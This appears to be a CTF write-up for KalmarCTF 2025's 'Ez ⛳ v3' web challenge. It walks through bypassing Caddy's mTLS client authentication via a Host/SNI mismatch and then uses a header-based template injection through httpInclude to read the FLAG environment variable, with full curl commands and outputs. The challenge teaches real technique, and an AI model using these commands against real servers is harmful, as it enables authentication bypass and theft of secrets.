---
title: "Ez ⛳ v3"
description: "To get the flag, you need: the mTLS cert, connecting from localhost, ... and break physics? Should be easy!\nChallenge note: the handout files contains `tls internal` while the hosted challenge mostly use real TLS.\nNOTE: Remote is working as intended! Even with the redirects." 
pubDate: 2025-03-11
ctf: "KalmarCTF 2025"
category: "web"
author: "sealldev"
section: "CTFs"
image: "images/25-kalmar/icon.png"
---

### Initial Look

We are supplied a `caddy-handout.zip` which extracts to a `Dockerfile`, `docker-compose.yml` and a `Caddyfile`.

The flag is initialised in the `Dockerfile`:
```dockerfile
FROM caddy:2.9.1-alpine
COPY Caddyfile /etc/caddy/Caddyfile

ENV FLAG='kalmar{test}'
```

The `Caddyfile` has all the config:
```
{
        debug
        servers  {
                strict_sni_host insecure_off
        }
}

*.caddy.chal-kalmarc.tf {
        tls internal
        redir public.caddy.chal-kalmarc.tf
}

public.caddy.chal-kalmarc.tf {
        tls internal
        respond "PUBLIC LANDING PAGE. NO FUN HERE."
}

private.caddy.chal-kalmarc.tf {
        # Only admin with local mTLS cert can access
        tls internal {
                client_auth {
                        mode require_and_verify
                        trust_pool pki_root {
                                authority local
                        }
                }
        }

        # ... and you need to be on the server to get the flag
        route /flag {
                @denied1 not remote_ip 127.0.0.1
                respond @denied1 "No ..."

                # To be really really sure nobody gets the flag
                @denied2 `1 == 1`
                respond @denied2 "Would be too easy, right?"

                # Okay, you can have the flag:
                respond {$FLAG}
        }
        templates
        respond /cat     `{{ cat "HELLO" "WORLD" }}`
        respond /fetch/* `{{ httpInclude "/{http.request.orig_uri.path.1}" }}`
        respond /headers `{{ .Req.Header | mustToPrettyJson }}`
        respond /ip      `{{ .ClientIP }}`
        respond /whoami  `{http.auth.user.id}`
        respond "UNKNOWN ACTION"
}
```

There are 3 main 'configuration' sections:
- `*` subdomains, redirect to `public` and have `tls internal`.
- `public` responds with the content `PUBLIC LANDING PAGE. NO FUN HERE.`, `tls internal` again.
- `private` has all the fun!

`private` has a bit more configuration but the breakdown:
- `tls internal` is initialised with the context that it authorises with mTLS so only the administrator can access it.
- `route /flag` only responds if you are connecting from `127.0.0.1` and that `1!=1` to get the flag.

There are a few other routes which can be summarised as follows:
- `/cat` returns a string `HELLO WORLD`
- `/fetch/*` returns the page specified in `/*`, eg `/fetch/cat` would send back `HELLO WORLD`.
- `/headers` prints out the request headers to formatted JSON.
- `/ip` returns the IP the request originates from
- `/whoami` return the `http.auth.user.id`
- All other endpoints return `UNKNOWN ACTION`.

### strict_sni_host to Authentication Bypass

If you were paying attention, we glossed over one segment of the `Caddyfile`:
```
{
        debug
        servers  {
                strict_sni_host insecure_off
        }
}
```

This option is strange, and has further documentation [here](https://caddyserver.com/docs/caddyfile/options#strict-sni-host) and is by default enabled when client authentication is used.

> Enabling this requires that a request's `Host` header matches the value of the `ServerName` sent by the client's TLS ClientHello, a necessary safeguard when using TLS client authentication. If there's a mismatch, HTTP status `421 Misdirected Request` response is written to the client.

By having this on `insecure_off`, we can mismatch the `Host` header and the URI we are requesting to, and access TLS authenticated endpoints.

Let's test this to access private. We need to forge the SNI, let's get the IP address of public:
```bash
$ ping public.caddy.chal-kalmarc.tf
PING f0ddaab5d349418ca0f6dc31d043813e.pacloudflare.com (172.65.208.191): 56 data bytes
64 bytes from 172.65.208.191: icmp_seq=0 ttl=64 time=18.684 ms
```

With the IP `172.65.208.191`, we have all the information we need to make the SNI: `public.caddy.chal-kalmarc.tf:443:172.65.208.191`.

We can now specify an internal subdomain, like `private`, and access endpoints. Let's try `cat` for example's sake.

```bash
$ curl --resolve public.caddy.chal-kalmarc.tf:443:172.65.208.191 \
     -H "Host: private.caddy.chal-kalmarc.tf" \
     https://public.caddy.chal-kalmarc.tf/cat
HELLO WORLD
```

Perfect! We can now access endpoints in `private`!

### Accessing from 127.0.0.1

Remembering the endpoints from earlier, we need to somehow access `/flag` from `127.0.0.1`, which with our current payload does the following:
```bash
$ curl --resolve public.caddy.chal-kalmarc.tf:443:172.65.208.191 \
     -H "Host: private.caddy.chal-kalmarc.tf" \
     https://public.caddy.chal-kalmarc.tf/flag
No ...
```

So, what is of interest?
- `/cat` serves no purpose
- `/fetch/*` does internal `httpInclude` and could be very useful!
- `/headers` might be useful
- `/ip` is useful for testing if we are really `127.0.0.1`
- `/whoami` might be useful?

Let's start with looking at what `httpInclude` does regarding `/fetch/*`

Reading the [docs on `httpInclude`](https://caddyserver.com/docs/modules/http.handlers.templates):
> Includes the contents of another file, and renders it in-place, by making a virtual HTTP request (also known as a sub-request). The URI path must exist on the same virtual server because the request does not use sockets; instead, the request is crafted in memory and the handler is invoked directly for increased efficiency.

Presumably, this uses `127.0.0.1` to make the request, so if we access `/fetch/ip` it should `httpInclude "/ip"`!

```bash
$ curl --resolve public.caddy.chal-kalmarc.tf:443:172.65.208.191 \
     -H "Host: private.caddy.chal-kalmarc.tf" \
     https://public.caddy.chal-kalmarc.tf/fetch/ip
127.0.0.1
```

We are now halfway there!

### We are not halfway there

Turns out that `1 != 1` is pretty hard to get around... So we need to find another way!

I realised something interesting instead using `/headers`. The templating engine uses `{{}}` to designate templates. And if `/fetch` is used are templates rendered again? It all relies on if our headers make it through.

A common Caddy variable is `{{now}}` which just returns the current time.

Firstly I try with just `/headers`:
```bash
$ curl --resolve public.caddy.chal-kalmarc.tf:443:172.65.208.191 \
     -H "Host: private.caddy.chal-kalmarc.tf" -H "idea: {{now}}" \
     https://public.caddy.chal-kalmarc.tf/headers
{
  "Accept": [
    "*/*"
  ],
  "Idea": [
    "{{now}}"
  ],
  "User-Agent": [
    "curl/8.7.1"
  ]
}
```

Let's now try through `/fetch/headers`:
```bash
$ curl --resolve public.caddy.chal-kalmarc.tf:443:172.65.208.191 \
     -H "Host: private.caddy.chal-kalmarc.tf" -H "idea: {{now}}" \
     https://public.caddy.chal-kalmarc.tf/fetch/headers
{
  "Accept": [
    "*/*"
  ],
  "Accept-Encoding": [
    "identity"
  ],
  "Caddy-Templates-Include": [
    "1"
  ],
  "Idea": [
    "2025-03-10 13:51:38.043763726 +0000 UTC m=+217394.911287425"
  ],
  "User-Agent": [
    "curl/8.7.1"
  ]
}
```

Bingo! We get the output to `{{now}}`!

### Reading `env`

As overwriting the definition of `1 == 1` is probably a lot more annoying than getting the `env`, let's look for that first!

Turn's out the [templating docs]() has an `env` variable!

> Gets an environment variable.
> ```
> {{env "VAR_NAME"}}
> ```

Sweet! Let's grab the flag.

### Solution

We can now use the SNI to access the internal `private` subdomain then abuse a SSTI bug on Caddy to read the environment variables for the flag.

```bash
$ curl --resolve public.caddy.chal-kalmarc.tf:443:172.65.208.191 \
     -H "Host: private.caddy.chal-kalmarc.tf" -H "idea: {{env \`FLAG\`}}" \
     https://public.caddy.chal-kalmarc.tf/fetch/headers
{
  "Accept": [
    "*/*"
  ],
  "Accept-Encoding": [
    "identity"
  ],
  "Caddy-Templates-Include": [
    "1"
  ],
  "Idea": [
    "kalmar{4n0th3r_K4lmarCTF_An0Th3R_C4ddy_Ch4ll}"
  ],
  "User-Agent": [
    "curl/8.7.1"
  ]
}
```

Flag: `kalmar{4n0th3r_K4lmarCTF_An0Th3R_C4ddy_Ch4ll}`